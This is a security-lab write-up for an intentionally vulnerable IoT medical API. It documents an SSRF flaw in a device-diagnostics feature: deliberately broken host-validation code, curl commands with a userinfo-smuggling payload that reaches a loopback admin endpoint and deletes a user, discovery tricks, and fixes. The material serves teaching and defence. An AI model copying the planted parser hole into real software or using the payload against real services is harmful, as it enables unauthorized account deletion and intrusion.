---
id: API7:2023
title: Server-Side Request Forgery (SSRF) — Device-Diagnostics Whitelist Bypass → Internal Admin
category: API
status: DONE
severity: High
owasp: API7:2023 — Server Side Request Forgery
cwe: CWE-918 (Server-Side Request Forgery) / CWE-20 (Improper Input Validation — naive host parse) / CWE-346 (Origin Validation Error — loopback-trusted internal endpoint)
source_docs:
  - stages/01_spec/output/API7-ssrf-spec.md
affected_components:
  - cloud_api/careotter/api_server/services/diagnostics_service.py
  - cloud_api/careotter/api_server/app.py
  - cloud_api/careotter/api_server/templates/diagnostics.html
  - cloud_api/careotter/api_server/templates/profile.html
verified_date: 2026-06-04
---

# API7 — Server-Side Request Forgery (Device Diagnostics)

> **OWASP:** API7:2023 — Server Side Request Forgery
> **CWE:** CWE-918 / CWE-20 / CWE-346
> **Severity:** High

> **Toggle.** Gated on `VULNERABLE`, read per-call in `DiagnosticsService`. The probe URL's host is checked against an **exact PER-USER whitelist** — only the requesting patient's **own** registered device(s) (`no_device` if they have none). With **`VULNERABLE=1`** the host is extracted by a **naive parser** (the first authority token) that is fooled by embedded credentials, so `http://<own-device-ip>@127.0.0.1:5002/…` validates as the patient's device while `requests` connects to **loopback** — reaching a loopback-only internal admin endpoint. With **`VULNERABLE=0` (secure)** the host is parsed with `urlparse` (the same parser the HTTP client connects with) + the same exact per-user whitelist + a loopback/link-local block, so there is no differential.

---

## Why It Matters

**SSRF (API7:2023)** is when the server can be coerced into issuing an HTTP request to an attacker-chosen destination. CareOtter is an IoT device manager that *legitimately* fetches device URLs server-side (it already does `GET http://<device_ip>:8081/health`). That makes a "pull live diagnostics from a device" feature a natural — and dangerous — SSRF surface: the cloud can reach things a patient cannot, above all its **own loopback interface**, where an internal management API trusts requests that originate from the server itself.

A **low-privilege authenticated patient** turns the device-diagnostics probe into a request to `http://127.0.0.1:5002/api/users/delete?username=…`. Because the request now originates from the server, the internal endpoint trusts it and **deletes an arbitrary user**. No admin credentials, no classic auth bug — the server is the **confused deputy**. This mirrors the canonical "stock-check" SSRF (`stockApi → /admin/delete?username=carlos`), adapted to a medical platform.

---

## The feature

A cloud-only "Device Diagnostics" panel (Flask + SQLite). The page shows a single **"Check device connectivity"** button — there is **no visible URL box**, so the server-side fetch is not advertised in the UI. The button posts the patient's registered device diagnostics URL as `probe_url` (carried in a hidden field) and the cloud **reflects the upstream status + body**. The attacker discovers the tamperable `probe_url` parameter by intercepting the request (Burp / DevTools), not from the UI.

> **UI rendering.** For a normal sensor `/health` reply (`status:"ok"`, `service`, `mac`, `wifi_ip`, `uptime`…) the page shows a friendly "Device online" summary — so it reads as a benign consumer connectivity check. **Any other reply falls back to the raw reflected status + body**, so the confused-deputy reflection (the 404-vs-200 oracle, the `via:"internal-loopback"` delete confirmation) is still fully readable in the UI. The raw `body`/`status` are always present in the `/api/device/diagnostics` JSON regardless of how the page chooses to render them.

| Method | Path | Auth | Purpose |
|--------|------|------|---------|
| `GET`  | `/diagnostics` | `@web_patient_required` | Diagnostics page — linked from the `index.html` nav bar |
| `POST` | `/api/device/diagnostics` `{probe_url}` | `@token_required` | Fetch `probe_url` server-side (host validated against the **caller's OWN** registered device only. `no_device` → 403 if they have none), reflect status+body |
| `GET`/`POST` | `/api/users/delete` | **multi-modal** (see note) | Admin JWT → delete any user. patient JWT → self-delete (password-gated). **no valid JWT + loopback → delete any user (the SSRF confused-deputy)**. otherwise `404` |
| `GET`  | `/robots.txt` | none | Discovery clue — `Disallow: /api/users/` |

> **The delete endpoint is now multi-modal (User Administration feature).** `/api/users/delete` grew an admin front-door (the `/admin/users` panel) and a patient self-delete (`/profile`), but the **loopback, no-JWT branch is unchanged** — it is this SSRF's confused deputy. The handler decodes the JWT first (`_decode_and_validate`, header **or** `careotter_token` cookie). the diagnostics probe (`http_requests.get`) forwards **no** `Authorization: Bearer`/cookie, so the server-to-server loopback call carries no valid JWT and still falls through to the loopback delete. A *forged* admin JWT (weak secret, API2) also deletes any user via the admin branch — but that needs a credential. the SSRF remains the only **no-credential** bypass.

The whitelist is **per-user**: only the device(s) registered to the **requesting patient** themselves (`device_ip` where `patient_username` == them, via `db.get_devices_for_patient`). A patient with **no registered device** gets `no_device` (403) and cannot diagnose at all. a patient can **never** probe *another* user's device — e.g. the simulated `careservice-alice` / `careservice-bob`, which belong to alice/bob (and only run the IGP channel on `:9999`, no `:8081` sensor, so they aren't diagnosable anyway). Throughout this doc, **`<device-ip>` is a placeholder for the requesting patient's OWN registered device IP** (e.g. the Raspberry Pi they claimed) — the only host whitelisted *for them*. Validation + fetch live in `services/diagnostics_service.py` (`_patient_device_hosts`), which reads `Config.VULNERABLE` per call.

---

## The vulnerability

```python
# diagnostics_service._validate — VULNERABLE branch (the bug)
host = self._naive_host(probe_url)        # "first authority token" → fooled by user@host
if host not in whitelist:                 # exact PER-USER whitelist. <device-ip> = caller's OWN device → whitelisted
    return False, 'host_not_allowed'
# ... then:  http_requests.get(probe_url)  # urllib3 connects to 127.0.0.1, path preserved

# _naive_host: everything up to the first @ : or / is taken as the host
authority = url.split('//', 1)[1].split('/', 1)[0]   # "<device-ip>@127.0.0.1:5002"
return re.split(r'[@:/]', authority)[0].lower()       # -> "<device-ip>"  (that's the userinfo)
```

The validator and the HTTP client **disagree on where the host is**: the naive parser reads `<device-ip>` (the credentials) as the host and waves it through. `requests`/urllib3 parse `<device-ip>` as Basic-auth userinfo and **connect to `127.0.0.1:5002`**, requesting `/api/users/delete?username=…` — **path and query preserved** (verified at the socket level, not just in a parser).

### Secure mode (`VULNERABLE=0`)

```python
host = (urlparse(probe_url).hostname or '').lower()   # correct parse → "127.0.0.1" for the payload
if host not in whitelist:                             # 127.0.0.1 ∉ whitelist → reject
    return False, 'host_not_allowed'
if self._is_dangerous_host(host):                     # also block loopback / link-local / localhost
    return False, 'host_not_allowed'
```

Symmetry (validate with the same `urlparse` the client connects with) + exact whitelist + a narrow loopback/link-local block. The block is deliberately **not** a broad private-IP ban — real devices live on `192.168/10/172` subnets, so the exact whitelist is the primary control.

---

## Exploit — patient escalates to deleting a user

**Precondition:** `VULNERABLE=1`. system initialized (`/initialize_iot` seeds the victim `target_tom`). patient `john_doe` logged in **and has registered/claimed his own device** (e.g. the Raspberry Pi via `register-by-hash`), so that device's `device_ip` is in his **per-user** whitelist — a patient with no device gets `no_device` (403). `<device-ip>` below is **`john_doe`'s own registered device IP**. replace it with the real value. The literal string `careservice` is **not** whitelisted (only a UI placeholder), and `john_doe` cannot use another user's device (e.g. `careservice-alice`).

![[api7_diagnostic.png]]

```bash
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H 'Content-Type: application/json' \
  -d '{"username":"john_doe","password":"johnny123"}' | jq -r .token)

# 1) Prove the probe reaches the device legitimately
curl -s -X POST http://localhost:5002/api/device/diagnostics \
  -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"probe_url":"http://<device-ip>:8081/health"}' | jq

# 2) SSRF: smuggle the whitelisted host as credentials. really connect to loopback
curl -s -X POST http://localhost:5002/api/device/diagnostics \
  -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"probe_url":"http://<device-ip>@127.0.0.1:5002/api/users/delete?username=target_tom"}' | jq
# → reflected body: {"deleted":"target_tom","ok":true,"via":"internal-loopback"}
```

`target_tom` is now deleted by a patient with no admin rights.

### Discovery (how the attacker finds `/api/users/...`)

- **SSRF as an oracle.** The internal endpoint returns **404** to external callers, so it is invisible from outside. the attacker must enumerate *through* the SSRF and read the reflected status/body to tell 404 from 200.
- **The endpoint is in your own traffic.** `/api/users/delete` is **multi-modal**: the same path the SSRF abuses also backs the patient **self-delete** on the account page (`templates/profile.html` → *Danger Zone* → "Delete my account"). `profile.js` fires `POST /api/users/delete {"password":…}` with the patient's **own** JWT. So any patient who uses — or merely inspects (DevTools / Burp) — the legitimate "delete my account" flow sees the privileged path name **in their own browser**, no enumeration or wordlist needed. The pivot is then direct: send the *same* path through the SSRF with **no** JWT and it falls to the loopback branch, deleting **any** user. Reusing one admin endpoint for the patient self-service is what leaks it — the self-delete is password-gated and self-only, but routing it through the SSRF strips **both** controls (no credential, arbitrary `username`).
- **A planted clue.** `GET /robots.txt` → `Disallow: /api/users/`. So it is solvable without blind brute force. The path being discoverable does **not** trivialise the bug: reaching it still requires the SSRF, because the endpoint trusts the *loopback origin*, not a credential.

![[api7_robotstxt.png]]

![[api7_profile_discovering_endpoint.png]]

![[api7_discover_endpoint.png]]

![[api7_delete_target_tom.png]]

---

## Expected Result

- **`VULNERABLE=1`:** `{"probe_url":"http://<device-ip>@127.0.0.1:5002/api/users/delete?username=target_tom"}` returns `200` with a reflected body `{"deleted":"target_tom","ok":true,"via":"internal-loopback"}`. the user is gone. A legit `http://<device-ip>:8081/health` probe still works.
- **`VULNERABLE=0` (secure):** the same payload → `host_not_allowed` (the `urlparse` host `127.0.0.1` is not whitelisted and is loopback). the victim survives. `http://127.0.0.1/…`, `http://localhost/…`, `http://169.254.169.254/…` are rejected in **both** modes.
- **Per-user whitelist (both modes):** a patient with **no registered device** → `no_device` (403). a patient probing **another** user's device (e.g. `careservice-alice` while logged in as `john_doe`) → `host_not_allowed`. The SSRF works only because `john_doe` smuggles **his own** device IP.
- `/api/users/delete` returns **404** to any non-loopback caller **that presents no valid admin/patient JWT**. (With a valid admin JWT it deletes any user. with a valid patient JWT it self-deletes, password-gated — the multi-modal User Administration feature.) The **no-credential** loopback SSRF path is unchanged and remains the only bypass that needs no account.

---

## How It Should Be

- **Parse once, parse correctly.** Extract the host with the *same* parser the HTTP client uses (`urlparse`/the library's own parser) and validate **that** — never a hand-rolled "first token" split. No decode-after-validate.
- **Exact allow-list** of device hosts. reject anything else by default.
- **Block dangerous targets** (loopback, link-local/cloud-metadata `169.254.169.254`, `localhost`) as defense in depth, and resolve-then-check to defeat DNS tricks.
- **Don't trust the network origin for authz.** The internal endpoint must require real authentication, not "the request came from localhost" — loopback trust + SSRF is the whole chain.
- **Egress controls**: restrict the diagnostics fetcher to the device subnet/port. disallow redirects (already `allow_redirects=False`).

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Input validation | Parse host with the client's parser. exact allow-list. no naive split | Kill the parser differential (CWE-918 / CWE-20) |
| Network | Block loopback/link-local/metadata. resolve-then-check. pin to device subnet | Stop the request reaching internal services |
| AuthZ | Internal endpoints require real auth, not loopback origin | Remove the confused-deputy target (CWE-346) |
| Egress | No redirects. timeout. least-privilege outbound | Limit blast radius |

---

## Verification Checklist

- [ ] `GET /diagnostics` renders for a logged-in patient. the **probe icon is in the `index.html` nav bar**.
- [ ] **`VULNERABLE=1`**: the `<device-ip>@127.0.0.1:5002/api/users/delete?username=target_tom`
      payload returns `200`, reflected body shows the delete, and `target_tom` is actually removed
      (connect-level, not just a parser assertion).
- [ ] **`VULNERABLE=1`**: a legit `http://<device-ip>:8081/health` probe is allowed.
- [ ] **`VULNERABLE=0`**: the same SSRF payload → `host_not_allowed`. victim survives. `127.0.0.1` /
      `localhost` / `169.254.169.254` rejected.
- [ ] `GET`/`POST` `/api/users/delete` from a **non-loopback** origin **without a valid admin/patient JWT** → `404`. (With a valid JWT it returns a real response — the multi-modal user-admin feature. the no-JWT loopback SSRF still deletes `target_tom`.)
- [ ] **No self-deadlock**: the SSRF's request to `:5002` is served concurrently (gunicorn `--threads 4`
      / dev `threaded=True`). the probe returns rather than hanging.
- [ ] **Re-seedable**: `/initialize_iot` recreates `target_tom`. the exploit never deletes
      `john_doe`/`care_john`.
- [ ] Discovery: the `/profile` self-delete (`templates/profile.html`) leaks `POST /api/users/delete`
      in the patient's own traffic. `/robots.txt` discloses `/api/users/`. reflected status/body
      distinguishes 404 vs 200 for path enumeration.

---

## Out of scope (different categories)

- Blind/redirect-based SSRF (302 → internal) — different mechanism. this is URL-parser confusion.
- DNS rebinding / resolution TOCTOU — the bug is the parser, not resolution timing.
- Cloud-metadata read (`169.254.169.254`) as the primary goal — that host is in the reject list. the lab target is the loopback internal **write** (privilege escalation).
- `/api/device/ping` stays as the loopback port-scanner recon primitive (intentional, not hardened).

---

## References

- Spec: `stages/01_spec/output/API7-ssrf-spec.md`
- `cloud_api/careotter/api_server/services/diagnostics_service.py` (`_validate`, `_naive_host`, the `VULNERABLE` toggle)
- `cloud_api/careotter/api_server/app.py` (`/api/device/diagnostics`, `/api/users/delete` [multi-modal], `/api/users` [admin list], `/admin/users`, `/robots.txt`, victim seed)
- `cloud_api/careotter/api_server/templates/diagnostics.html` (probe page), `templates/users.html` (admin user-admin panel), `templates/profile.html` + `static/js/profile.js` (patient self-delete → `POST /api/users/delete`, the discovery vector that leaks the path in the patient's own traffic)
- Related: `API2_Broken_Authentication.md` — the JWT secret is weak/forgeable, so a **forged admin JWT** deletes any user through `/api/users/delete`'s admin branch **without** the SSRF. Intentional. the SSRF is the only *no-credential* path. Admin panel: `/admin/users`. user-list source: `GET /api/users` (admin-only).
- Related: `API3_Broken_Objetc_Property_Level_Authorization.md` (the naive-`int()` and naive-host parsing share a type/parse-confusion theme), `API1_Broken_Object_Level_Authorization.md` (other priv-esc primitives)
